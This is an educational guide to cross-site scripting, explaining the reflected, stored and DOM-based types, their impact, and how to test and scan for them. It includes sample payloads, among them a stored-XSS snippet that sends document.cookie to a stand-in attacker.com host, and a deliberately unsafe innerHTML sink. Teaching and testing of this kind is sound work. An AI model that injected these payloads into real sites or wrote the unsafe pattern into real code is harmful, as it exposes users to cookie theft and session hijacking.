# Cross-Site Scripting (XSS) Types

## What is XSS?

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

## Types of XSS

### 1. Reflected XSS

- **Non-persistent**: Payload is not stored on server
- **Delivered via URL**: Malicious script is part of the request
- **Immediate execution**: Executes when victim clicks malicious link

**Example**:
```
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (Persistent)

- **Persistent**: Payload is stored on server (database, file system)
- **Affects multiple users**: Anyone viewing the infected page is affected
- **Common targets**: Comment sections, user profiles, message boards

**Example**:
A comment containing:
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 3. DOM-Based XSS

- **Client-side**: Vulnerability in client-side JavaScript
- **No server involvement**: Payload never sent to server
- **DOM manipulation**: Exploits unsafe use of DOM APIs

**Example**:
```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);

// Exploit
http://site.com/#<img src=x onerror=alert('XSS')>
```

## Impact of XSS

- **Session hijacking**: Stealing authentication cookies
- **Credential theft**: Creating fake login forms
- **Phishing**: Redirecting to malicious sites
- **Defacement**: Altering page content
- **Malware distribution**: Forcing downloads
- **Keylogging**: Recording user inputs

## Detection Methods

1. **Manual Testing**
   - Submit XSS payloads in all input fields
   - Check URL parameters
   - Inspect form submissions

2. **Automated Scanning**
   - Burp Suite Scanner
   - OWASP ZAP
   - XSStrike

3. **Browser Developer Tools**
   - Inspect DOM changes
   - Monitor console for errors
   - Check network requests

## Common Injection Points

- Search boxes
- Comment sections
- User profile fields
- URL parameters
- HTTP headers (Referer, User-Agent)
- File upload filenames

## Testing Checklist

- [ ] Test all input fields
- [ ] Test URL parameters
- [ ] Test HTTP headers
- [ ] Check for input validation
- [ ] Check for output encoding
- [ ] Test with encoded payloads
- [ ] Test DOM manipulation
- [ ] Review JavaScript code for sinks

## References

- OWASP XSS Guide
- PortSwigger XSS Cheat Sheet
- HackerOne XSS Reports
